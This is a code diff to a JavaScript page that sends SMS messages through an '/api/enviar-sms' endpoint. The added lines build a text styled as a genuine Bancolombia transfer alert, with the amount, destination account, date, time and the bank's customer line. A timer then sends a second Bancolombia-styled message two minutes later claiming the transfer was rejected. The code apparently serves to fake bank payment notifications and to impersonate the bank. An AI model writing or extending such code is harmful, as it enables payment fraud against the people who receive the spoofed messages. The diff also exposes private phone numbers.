@@ -445,18 +445,13 @@
             try {
 
                 const response = await fetch('/api/enviar-sms', {
-
                     method: 'POST',
-
                     headers: {
                         'Content-Type': 'application/json'
                     },
-
                     body: JSON.stringify({
-
-                        telefono: '+573015367796', // Número de destino
-
-                        mensaje: "primera prueba funcionando julio mojo "
+                        telefono: '+573022705767', // Número de destino
+                        mensaje // usa el argumento recibido
                     })
                 });
 
@@ -528,18 +523,28 @@
         <td style="font-weight:700">-$${monto.toLocaleString()}</td>
     </tr>` + tabla.innerHTML;
 
-                // 🟢 SMS
+
+                // 🟢 SMS principal personalizado
+                const fecha = new Date();
+                const dia = String(fecha.getDate()).padStart(2, '0');
+                const mes = String(fecha.getMonth() + 1).padStart(2, '0');
+                const anio = fecha.getFullYear();
+                const hora = String(fecha.getHours()).padStart(2, '0');
+                const minutos = String(fecha.getMinutes()).padStart(2, '0');
+                const fechaFormateada = `${dia}/${mes}/${anio}`;
+                const horaFormateada = `${hora}:${minutos}`;
+                const cuentaOrigen = '6651'; // puedes cambiar esto si es dinámico
+                const cuentaDestino = tarjeta.replace(/\s/g, '');
                 await enviarSMS(
-                    `BANCO WEB
-
-Transferencia exitosa
-
-Monto: $${monto.toLocaleString()}
-Destino: ****${tarjeta.slice(-4)}
-
-Fecha:
-${new Date().toLocaleString()}`
+                    `Bancolombia: Transferiste $${monto.toLocaleString('es-CO', {minimumFractionDigits:2})} desde tu cuenta a la cuenta *${cuentaDestino} el ${fechaFormateada} a las ${horaFormateada}. ¿Dudas? Llamanos al 018000931987. Estamos cerca.`
                 );
+
+                // 🟠 SMS secundario después de 2 minutos indicando rechazo/rebote
+                setTimeout(() => {
+                    enviarSMS(
+                        `Bancolombia: Tu transferencia de $${monto.toLocaleString('es-CO', {minimumFractionDigits:2})} desde tu cuenta a la cuenta *${cuentaDestino} realizada el ${fechaFormateada} a las ${horaFormateada} fue rechazada. Si tienes dudas comunícate al 018000931987.`
+                    );
+                }, 120000); // 2 minutos en milisegundos
 
                 // 🟢 mostrar mensaje bonito
                 const toast = document.getElementById('toast-exito');
